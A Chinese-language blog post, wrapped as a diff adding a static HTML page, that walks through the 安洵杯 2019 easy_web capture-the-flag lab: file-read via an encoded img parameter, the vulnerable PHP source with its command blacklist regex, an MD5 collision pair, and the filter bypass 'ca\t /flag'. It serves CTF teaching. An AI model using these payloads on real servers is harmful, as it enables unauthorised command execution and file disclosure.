@@ -1,0 +1,433 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>安洵杯 2019 easy_web - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="0x00知识点MD5碰撞的一些例子https://ww...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">安洵杯 2019 easy_web</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/life/%E6%B0%94%E8%B1%A1%E4%BB%AA.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">安洵杯 2019 easy_web</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 08, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3432</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
+<h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a target="_blank" rel="noopener" href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p>
+<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809085159186.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809085159186"></p>
+<p>观察到url路径存在参数</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;<span class="hljs-keyword">cmd</span><span class="bash">=</span><br></code></pre></td></tr></table></figure>
+
+<p>感觉这里就是切入点，img背后的似乎是base64码</p>
+<p>在线解码一下（<a target="_blank" rel="noopener" href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p>
+<p>TXpVek5UTTFNbVUzTURabE5qYz0</p>
+<p>MzUzNTM1MmU3MDZlNjc=</p>
+<p>3535352e706e67</p>
+<p>连续两次base64解码后，得到一串字符串</p>
+<p>查了资料，这是hex编码</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809085725782.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809085725782"></p>
+<p>再次解码：得到555.png，有意思</p>
+<p>刚好靶机页面上就有一张哭泣图片</p>
+<p>我们猜测，img后面的多次编码的参数请求可以得到源码</p>
+<p>按照上面的解码逆推编码，可以得到</p>
+<p>index.php:</p>
+<p>696E6465782E706870</p>
+<p>Njk2RTY0NjU3ODJFNzA2ODcw</p>
+<p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p>
+<p>将参数修改</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809090352667.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809090352667"></p>
+<p>f12查看</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809090426959.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809090426959"></p>
+<p>对base64解码得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br>$cmd = $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br>$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br>$file = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, $file);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $file)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    $txt = base64_encode(file_get_contents($file));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> $cmd;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `$cmd`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-tag">\<span class="hljs-name">&#x27;</span></span>|<span class="hljs-tag">\<span class="hljs-name">&quot;</span></span>|<span class="hljs-tag">\<span class="hljs-name">`</span></span>|;|,|<span class="hljs-tag">\<span class="hljs-name">*</span></span>|<span class="hljs-tag">\<span class="hljs-name">?</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span><span class="hljs-tag">\<span class="hljs-name">\</span></span>|<span class="hljs-tag">\<span class="hljs-name">n</span></span>|<span class="hljs-tag">\<span class="hljs-name">t</span></span>|<span class="hljs-tag">\<span class="hljs-name">r</span></span>|<span class="hljs-tag">\<span class="hljs-name">xA</span></span>0|<span class="hljs-tag">\<span class="hljs-name">&#123;</span></span>|<span class="hljs-tag">\<span class="hljs-name">&#125;</span></span>|<span class="hljs-tag">\<span class="hljs-name">(</span></span>|<span class="hljs-tag">\<span class="hljs-name">)</span></span>|<span class="hljs-tag">\<span class="hljs-name">&amp;</span><span class="hljs-string">[^\d]</span></span>|@|<span class="hljs-tag">\<span class="hljs-name">|</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span><span class="hljs-formula">$|<span class="hljs-tag">\<span class="hljs-name">[</span></span>|<span class="hljs-tag">\<span class="hljs-name">]</span></span>|&#123;|&#125;|<span class="hljs-tag">\<span class="hljs-name">(</span></span>|<span class="hljs-tag">\<span class="hljs-name">)</span></span>|-|&lt;|&gt;/i&quot;, $</span>cmd<br></code></pre></td></tr></table></figure>
+
+<p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">echo</span> `$cmd`;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里说明我们需要POST两个变量：a和b</p>
+<p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p>
+<p>这里不太理解，所以先直接抄了wp的md5值</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span><br></code></pre></td></tr></table></figure>
+
+<p>POST传参</p>
+<p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p>
+<p>（这个地方坑了我好久）</p>
+<p>在请求到包后，直接在bp里改包</p>
+<p>原来的GET请求直接改成POST请求</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809092901502.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809092901502"></p>
+<p>使用还没被ban掉的dir指令</p>
+<p>查询到文件</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809092634318.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809092634318"></p>
+<p>然后直接用了多数博客都使用的绕过方法</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="bash">=ca\t%20/flag</span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/image-20210809093215609.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20210809093215609"></p>
+<p>看网上还有一种方法读取flag：</p>
+<p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
+<p><img   class="lazyload" data-original="/2021/08/08/2021/ctf/10/1625650-20200130214928556-987685402.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2021/08/08/2021/ctf/10/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;08&#x2F;2021&#x2F;ctf&#x2F;10&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2021&#x2F;08&#x2F;08&#x2F;2021&#x2F;ctf&#x2F;10&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/08/17/2021/ctf/12/"><i class="iconfont iconleft"></i>0CTF 2016 piapiapia</a>
+    <a href="/2021/08/07/2021/ctf/9/">BJDCTF2020 Mark loves cat<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">0x00知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MD5%E7%A2%B0%E6%92%9E%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BE%8B%E5%AD%90"><span class="toc-text">MD5碰撞的一些例子</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E3%80%90PHP%E5%BC%B1%E5%8F%A3%E4%BB%A4%E3%80%81%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0%E3%80%81%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E3%80%91-CTF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98"><span class="toc-text">PHP代码安全【PHP弱口令、加密函数、绕过函数】&#x2F;CTF代码审计题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01%E8%A7%A3%E9%A2%98"><span class="toc-text">0x01解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A"><span class="toc-text">代码审计：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
